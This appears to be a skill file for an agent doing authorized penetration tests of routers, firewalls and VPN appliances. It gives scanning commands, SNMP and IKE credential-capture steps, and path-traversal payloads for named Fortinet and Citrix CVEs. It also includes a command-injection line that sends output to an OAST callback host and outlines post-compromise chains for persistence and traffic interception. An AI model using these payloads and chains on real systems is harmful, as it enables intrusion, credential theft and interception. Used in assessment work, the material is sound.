---
name: network_device
description: Authorized assessment of switches, routers, and firewalls — fingerprint the device, test management exposure, and validate known CVEs and misconfigurations.
---

# Network Device

A network device is a switch, router, firewall, VPN concentrator, load balancer, or wireless controller (Cisco IOS/IOS-XE/ASA/FTD, Juniper Junos, Fortinet FortiOS, Palo Alto PAN-OS, MikroTik RouterOS, pfSense/OPNsense, F5 BIG-IP, Citrix ADC/NetScaler, Aruba, HPE/Comware, Ubiquiti). The attacker's objective is to reach a management plane that should never be Internet-facing — telnet/SSH/HTTPS admin UIs, SNMP, REST/NETCONF APIs, vendor-specific autoconfig services — then turn a default credential, exposed config, or unpatched edge-device CVE into device administrative control, config exfiltration (which contains downstream credentials), traffic interception, or a pivot deeper into the network. Edge VPN/firewall appliances are the single most actively exploited asset class on the perimeter; treat any management interface reachable from your scan position as a critical finding by default.

## Attack Surface

- **Management protocols**: SSH (22), Telnet (23), HTTP/HTTPS admin (80/443/4443/8443/10443), SNMP (161/udp), NETCONF (830), RESTCONF, vendor APIs.
- **Routing/discovery protocols**: BGP (179), OSPF, EIGRP, RIP, VRRP/HSRP, CDP/LLDP, STP — often unauthenticated on the LAN/peering side.
- **VPN/remote-access**: IKE/IPsec (500/4500 udp), SSL-VPN portals (PAN GlobalProtect, Fortinet, Citrix Gateway, Cisco AnyConnect/WebVPN).
- **Aux/legacy**: TFTP (69/udp) config push/pull, FTP, finger, Smart Install (4786/Cisco), bootp/DHCP, NTP, syslog, GRE/IPsec tunnel endpoints.
- **Out-of-band**: IPMI/BMC, serial console servers, vendor cloud-management agents (Meraki, FortiManager, Panorama).
- **Credential reuse**: configs embed SNMP communities, RADIUS/TACACS+ secrets, IPsec PSKs, local user hashes (type 7 reversible, type 5/8/9), and downstream service passwords.

## Recon & Enumeration

```bash
# Fast port discovery, then targeted service/version fingerprint
naabu -host 203.0.113.10 -top-ports 1000 -p 22,23,69,80,161,179,443,500,830,2000,4443,4786,8080,8443,10443 -o ports.txt
nmap -sS -sV -O -p 22,23,80,161,443,830,4443,8443,10443 -sU -p161,500,4500,69 203.0.113.10 -oA nd_scan

# SNMP — communities are the fastest win; default/guessable strings expose full config
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 203.0.113.10
snmpwalk -v2c -c public 203.0.113.10 1.3.6.1.2.1.1     # sysDescr/sysName -> exact model + firmware
snmpwalk -v2c -c public 203.0.113.10 1.3.6.1.2.1.25    # hrSWRun, installed sw
nmap -sU -p161 --script snmp-info,snmp-sysdescr,snmp-interfaces 203.0.113.10
# Cisco config exfil via SNMP-write (rw community) -> TFTP
snmp-check 203.0.113.10 -c private

# Web/management plane fingerprint
httpx -u https://203.0.113.10:8443 -title -tech-detect -status-code -tls-grab -favicon -web-server
wafw00f https://203.0.113.10:10443

# IKE/IPsec aggressive-mode + vendor fingerprint (PSK hash capture)
ike-scan -M 203.0.113.10
ike-scan -A -M -P psk.txt 203.0.113.10           # aggressive mode -> offline PSK crack

# SSH/Telnet banner + host key (firmware era, weak kex)
nmap -p22 --script ssh2-enum-algos,ssh-hostkey 203.0.113.10

# Cisco Smart Install (unauth config pull/RCE on legacy IOS)
nmap -p4786 --script cisco-siet 203.0.113.10      # or: pip3 install siet ; SIET.py -i 203.0.113.10 -g

# Known-CVE sweep — edge appliances have the densest CVE coverage in nuclei
nuclei -u https://203.0.113.10:10443 -tags cisco,fortinet,paloalto,citrix,mikrotik,juniper,f5,network -s critical,high -silent -j -o nd_nuclei.jsonl
nuclei -l mgmt_urls.txt -as -s critical,high -rl 30 -c 10 -bs 10 -timeout 10 -retries 1 -j -o nd_as.jsonl

# Admin-UI path/endpoint discovery once fingerprinted
ffuf -u https://203.0.113.10:10443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,401,403
katana -u https://203.0.113.10:10443 -jc -d 2 -silent
```

```bash
# OAST oracle for blind command-injection / SSRF in appliance CVEs
interactsh-client -v          # gives a fresh *.oast.fun; embed in injection payloads, watch for callbacks

# TFTP config pull/push (legacy push-config endpoints, Smart Install)
atftp --get -r running-config -l pulled.conf 203.0.113.10   # or run a TFTP listener for SNMP-RW exfil

# Credential discovery in any exfiltrated config or firmware image
gitleaks detect --no-git -s ./extracted_config -v
trufflehog filesystem ./firmware_unpacked --only-verified
binwalk -e firmware.bin       # unpack vendor firmware to inspect web roots, hardcoded creds, keys
```

Install-as-needed: `pip3 install impacket routersploit`; `apt-get install -y snmp snmp-mibs-downloader onesixtyone ike-scan atftp binwalk`; `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`; RouterSploit for vendor exploit/scanner modules (`use scanners/autopwn`); `git clone https://github.com/frostbits-security/SIET` for Cisco Smart Install; hashcat for offline hash cracking of recovered config secrets.

## Methodology

1. **Locate the device and management plane.** From the authorized scan position, map every reachable port. Anything that is a management protocol (SSH/Telnet/HTTPS-admin/SNMP/NETCONF) reachable from an untrusted segment is itself the first finding.
2. **Fingerprint exactly.** Resolve vendor + model + firmware version. SNMP `sysDescr`, HTTPS title/favicon hash, SSH host-key/banner, IKE vendor IDs, and TLS cert CN all converge on a precise build. The firmware version drives the CVE list — guessing the vendor is not enough.
3. **Map version to known CVEs.** Cross-reference the firmware build against CISA KEV and vendor PSIRT advisories. Edge VPN/firewall CVEs (auth-bypass, path-traversal-to-RCE, command injection) dominate. Drive nuclei with vendor tags.
4. **Test management exposure.** Try default and vendor-documented credentials; check for unauthenticated admin endpoints; assess SNMP community strength (read and write).
5. **Test protocol-level weaknesses.** SNMP write, IKE aggressive-mode PSK capture, Smart Install, unauthenticated routing protocol participation, TFTP config pull.
6. **Validate one high-impact path** with a minimal, non-destructive PoC and stop at proof.

## Key Weaknesses / Techniques

- **Default / weak credentials**: `admin/admin`, `cisco/cisco`, `admin/<blank>`, MikroTik `admin/<blank>`, Ubiquiti `ubnt/ubnt`. Validate manually before any guarded automation; never lockout-bomb production AAA.
- **Exposed management UI + auth bypass CVEs** (the dominant class):
  - Citrix ADC/Gateway path traversal: `GET /vpn/../vpns/cfg/smb.conf` (CVE-2019-19781); newer auth-bypass on `/oauth/idp/.well-known/...` (CVE-2023-3519 RCE).
  - Fortinet FortiOS SSL-VPN path traversal `GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession` (CVE-2018-13379) and admin auth-bypass (CVE-2022-40684) via crafted `Forwarded`/`X-Forwarded-For` to the REST API.
  - PAN-OS GlobalProtect command injection / auth-bypass (CVE-2024-3400 `SESSID` path-traversal-to-RCE).
  - F5 BIG-IP iControl REST auth-bypass (CVE-2022-1388, CVE-2023-46747) and TMUI RCE.
  - Validate with the matching nuclei template rather than free-handing payloads:
    ```bash
    nuclei -u https://203.0.113.10:10443 -id CVE-2022-40684,CVE-2023-3519,CVE-2018-13379,CVE-2024-3400,CVE-2022-1388 -silent
    ```
- **SNMP misconfiguration**: a read community leaks the full topology and (with `1.3.6.1.4.1.9.9.96` on Cisco) a write community can trigger a TFTP config upload to your listener, exposing every embedded secret.
- **IKE aggressive mode**: the responder returns a hash of the PSK before authentication; capture with `ike-scan -A` and crack offline (`psk-crack psk.txt`).
- **Cisco type-7 passwords** in any obtained config are trivially reversible; type-5/8/9 are crackable offline with hashcat (`-m 500/9200/9300`).
- **Unauthenticated services**: Smart Install (4786) on legacy IOS allows config read/replace and IOS image swap; unauthenticated routing protocol injection (OSPF/BGP/HSRP) lets you reroute or blackhole traffic.
- **Stale/weak TLS & SSH**: SSLv3/TLS1.0, RSA-1024 host keys, CBC-only ciphers indicate old firmware and weak transport — corroborating evidence, escalate to CVE checks.
- **MikroTik RouterOS**: Winbox (8291) info-leak/auth-bypass (CVE-2018-14847) reads `/rw/store/user.dat` and recovers admin credentials; check RouterOS version via Winbox or `/nova` API. CVE-2023-30799 (Jet) escalates to root from admin.
- **Blind command injection**: for appliance CVEs where output is not returned, inject an OAST callback to confirm execution before claiming RCE:
  ```bash
  # example: confirm execution via DNS callback (no data destruction)
  curl -sk "https://203.0.113.10:443/<vuln-endpoint>" --data 'cmd=nslookup $(id | tr " " .).abc123.oast.fun'
  # then watch interactsh-client stdout for the inbound hit
  ```
- **NETCONF/RESTCONF over default creds**: `ssh -s -p830 admin@203.0.113.10 netconf` then send a `<get-config>` RPC; RESTCONF `GET /restconf/data/...` with default auth dumps running config as JSON/XML.

## Validation

- Confirm the **exact firmware build** (SNMP sysDescr, UI version banner, or post-auth `show version`) before claiming a version-based CVE — fingerprint guesses are not findings.
- For auth-bypass/RCE CVEs, demonstrate a benign primitive: read a non-sensitive file via path traversal, or run an identity command (`whoami`/`get system status`) and capture the response. Do not modify config, write files, or reboot.
- For SNMP, show a single sysName/interface read with the discovered community; for write, prove write capability against a harmless OID rather than pulling the full config unless the engagement requires it.
- For default creds, log in once, screenshot the privileged dashboard, and log out — no config changes.
- Capture the raw request/response (or tool output) and the precise CVE ID / OID / credential pair so the finding is independently reproducible.

## False Positives

- **Version banner ≠ vulnerable**: many CVEs need a specific feature enabled (SSL-VPN configured, GlobalProtect portal up, iControl exposed). A matched banner without the vulnerable feature is informational.
- **Vendor backports**: appliances often carry patched builds whose version string still looks old; trust active PoC over version inference.
- **Honeypots / decoy banners**: a "Cisco" telnet banner on an odd port with no corroborating SNMP/TLS/SSH evidence may be a deception appliance.
- **`public` community that is read-only and exposes only sysDescr** is low severity, not config disclosure — verify what the OID tree actually returns.
- **Self-signed cert / weak cipher alone** is a hygiene issue, not exploitation; do not inflate severity.
- **Rate-limited login that returns generic errors** is not a credential-validity oracle — avoid false "valid creds" claims.

## Chaining & Impact

- Exposed mgmt UI + auth-bypass/RCE → device admin → **full config dump** → embedded RADIUS/TACACS+/SNMP/IPsec secrets → lateral movement into AAA and adjacent devices.
- SNMP-RW → TFTP config exfil → crack type-5/8/9 hashes → reuse credentials org-wide.
- Firewall/VPN compromise → add an admin account or VPN user, modify ACLs/NAT, enable a port-mirror/SPAN or GRE tunnel → **persistent traffic interception** and a pivot into internal segments.
- Router compromise → BGP/OSPF route injection → traffic redirection, blackhole, or man-in-the-middle.
- Edge appliance RCE → underlying Linux/BSD shell → credential harvest from running config and disk → deeper network compromise. These chains are why perimeter network devices are the top-exploited KEV category.

## Pro Tips

- Always pin firmware version first; the CVE list collapses to a handful once you know the exact build, and you avoid noisy untargeted scanning.
- IKE aggressive mode is a quiet, high-yield offline-crack path that bypasses login lockouts entirely — check it before touching the SSL-VPN login form.
- The config file is the real prize, not the shell: it hands you downstream and AAA credentials. Prioritize any path that yields config read (SNMP-RW, Smart Install, path traversal) over pure RCE.
- Throttle and never brute-force against TACACS+/RADIUS-backed logins — you will lock out real admins and trip SOC alerts; validate single known/default pairs only.
- Treat any management interface reachable from the Internet as critical on its own; the CVE is often just the confirmation, the exposure is the finding.
- favicon hashes (`httpx -favicon`) reliably fingerprint Citrix/Fortinet/PAN portals even when titles and headers are stripped.
- Edge-device CVEs move fast; when a build looks recent, query the vendor PSIRT / CISA KEV before concluding it is safe.
